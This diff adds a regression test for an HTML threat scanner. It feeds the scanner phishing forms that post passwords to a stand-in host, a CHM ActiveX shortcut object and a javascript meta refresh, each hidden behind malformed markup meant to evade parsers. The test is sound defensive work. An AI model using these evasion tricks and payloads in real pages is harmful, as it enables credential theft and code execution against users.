@@ -598,3 +598,61 @@ def test_review_r5_regressions_svg_prefix_in_html_self_closing_rawtext_and_bang_
     t0 = time.perf_counter()
     _scan(tmp_path, "adv_bang_comments.html", adv_bang)
     assert time.perf_counter() - t0 < 2.0
+
+
+def test_review_r6_regressions_foreign_self_closing_and_html5_eq_attr_states(
+    tmp_path: Path,
+) -> None:
+    # Blocker 1: HTML5 foreign-content self-closing (<svg>/<math>)
+    for idx, prefix in enumerate(
+        (
+            b"<svg><title/></svg>",
+            b"<svg><style/></svg>",
+            b"<svg><script/></svg>",
+            b"<math><style/></math>",
+            b'<svg/><textarea><x a="</textarea>',
+        )
+    ):
+        doc_cred = (
+            b"<!DOCTYPE html><html><body>"
+            + prefix
+            + b'<form action="https://phish.example/steal"><input type="password"></form>'
+            b"</body></html>"
+        )
+        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"fsc_cred_{idx}.html", doc_cred))
+
+        doc_chm = (
+            b"<!DOCTYPE html><html><body>"
+            + prefix
+            + b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+            b'<param name="Command" value="ShortCut"></object></body></html>'
+        )
+        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"fsc_chm_{idx}.html", doc_chm))
+
+    # Blocker 2: HTML5 leading '=' (<a =">, <a/=">) and duplicate '=' (<a x==">, <a x= =">)
+    for idx, bad_tag in enumerate((b'<a =">', b'<a/=">', b'<a x==">', b'<a x= =">')):
+        doc_chm = (
+            b"<!DOCTYPE html><html><body>"
+            + bad_tag
+            + b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+            b'<param name="Command" value="ShortCut"></object><!--"--></body></html>'
+        )
+        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"eq_chm_{idx}.html", doc_chm))
+
+        doc_cred = (
+            b"<!DOCTYPE html><html><body>"
+            + bad_tag
+            + b'<form action="https://phish.example/steal"><input type="password"></form>'
+            b'<!--"--></body></html>'
+        )
+        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"eq_cred_{idx}.html", doc_cred))
+
+        doc_meta = (
+            b"<!DOCTYPE html><html><head>"
+            + bad_tag
+            + b'<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
+            b'<!--"--></head></html>'
+        )
+        assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(
+            _scan(tmp_path, f"eq_meta_{idx}.html", doc_meta)
+        )
